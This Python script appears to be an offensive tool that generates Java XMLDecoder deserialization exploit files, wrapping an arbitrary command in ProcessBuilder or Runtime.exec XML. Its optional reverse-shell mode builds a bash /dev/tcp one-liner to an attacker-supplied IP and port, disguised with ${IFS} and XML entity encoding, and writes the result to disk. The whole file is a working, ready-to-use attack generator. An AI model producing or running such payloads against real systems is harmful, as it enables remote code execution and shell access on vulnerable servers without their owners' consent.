import argparse
import base64


def logo():
    logo_file = open(r'logo.txt')
    logo_file = logo_file.read()
    print('\033[1;36m\t' + logo_file + '\033[0m')

def exploit(exploit_type):
    processbuilder = '''<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_66" class="java.beans.XMLDecoder">
    <object class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="{0}">
            {1}
        </array>
        <void method="start"></void>
    </object>
</java>
    '''

    runtime = '''<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_66" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
            <array class="java.lang.String" length="{0}">
                {1}
            </array>
        </void>
    </object>
</java>
    '''

    if exploit_type == 'processbuilder':
        return processbuilder
    else:
        return runtime

def command():
    parser = argparse.ArgumentParser(prog='python main.py', description='XMLDecode_Exploit_Generator.')
    parser.add_argument('type', help='Enter processbuilder or runtime to select exploit type.', type=str)
    parser.add_argument('command', help='Enter the command to be executed.', type=str)
    parser.add_argument('file_path', help='Enter the location to save the xml file.', type=str)
    parser.add_argument('--reverse_shell', help='Enter attacker IP address, for example 192.168.249.145:9999', type=str)
    args = parser.parse_args()
    return args.type, args.command, args.file_path, args.reverse_shell

def save_exploit(file_path, exploit_xml):
    xml_file = open(file_path, 'w')
    xml_file.write(exploit_xml)
    xml_file.close()
    print('\033[1;31m[+] XMLDecode-Exploit generator successfully, the xml file saved to ' + file_path + '\033[0m')
    exit()

def rebound_shell(reverse_shell):
    ip = reverse_shell.split(':')[0]
    port = reverse_shell.split(':')[1]
    shell = 'bash -c bash${IFS}' + '-i>&amp;/dev/tcp/{}/{}&lt;&amp;1'.format(ip, port)
    return shell

def XMLDecode_Exploit_Generator():
    exploit_type, command_input, file_path, reverse_shell = command()
    if reverse_shell:
        command_input = rebound_shell(reverse_shell)
        print(command_input)

    command_input = command_input.strip().split()
    index = 0
    xml_arguments = []
    for arg in command_input:
        xml_argument = '<void index="{0}"><string>{1}</string></void>'.format(index, arg)
        xml_arguments.append(xml_argument)
        index += 1

    exploit_xml_arguments = ''.join(xml_arguments)
    exploit_xml = exploit(exploit_type).format(len(command_input), exploit_xml_arguments)
    save_exploit(file_path, exploit_xml)

if __name__ == '__main__':
    logo()
    XMLDecode_Exploit_Generator()